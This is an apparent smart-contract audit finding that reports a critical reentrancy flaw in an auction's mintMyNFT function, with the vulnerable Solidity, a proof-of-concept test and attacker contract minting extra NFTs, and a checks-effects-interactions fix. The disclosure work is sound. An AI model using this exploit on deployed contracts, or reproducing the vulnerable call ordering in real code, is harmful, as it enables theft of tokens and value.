# [C] Winner can mint any number of NFTs using reentry

## Summary
Severity: Critical
Contest weight: 0.5524
Dataset id: 3958
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
When someone wins in AuctionV1 they can mint an NFT:
```solidity
function mintMyNFT() public {
    require(isWinner(_msgSender()), "Caller is not a winner");
    require(!hasMinted[_msgSender()], "NFT already minted");
    INFTLotteryTicket(nftContractAddr).lotteryMint(_msgSender());
    hasMinted[_msgSender()] = true;
}
```
The issue is that this is susceptible to reentry since the hasMinted state is changed after the call to lotteryMint. lotteryMint will mint an ERC1155 token which, if the receiver is a contract, calls onERC1155Received on the receiver. This can be used to reenter into mintMyNFT to mint any number of NFTs.

## Proof of Concept
```solidity
function test_WinnerReentrancyToMintMoreNfts() public {
    AuctionWinner winner = new AuctionWinner(usdc, auction);
    winner.deposit();
    vm.startPrank(seller);
    auction.startLottery();
    auction.setupNewRound(block.timestamp, 1);
    auction.selectWinners();
    vm.stopPrank();
    winner.mintNft();
}
```
Using this code in the reentry contract:
```solidity
function mintNft() public {
    auction.mintMyNFT();
    uint256 balance = INFTLotteryTicket(auction.nftContractAddr()).balanceOf(address(this));
    // abuse reentry to mint 10 nfts
    if (balance < 10) {
        auction.mintMyNFT();
    }
}
```
Please find the whole test setup here.

## Recommendation
Consider changing the hasMinted before the call to mint:
```solidity
function mintMyNFT() public {
    require(isWinner(_msgSender()), "Caller is not a winner");
    require(!hasMinted[_msgSender()], "NFT already minted");
    hasMinted[_msgSender()] = true;
    INFTLotteryTicket(nftContractAddr).lotteryMint(_msgSender());
```
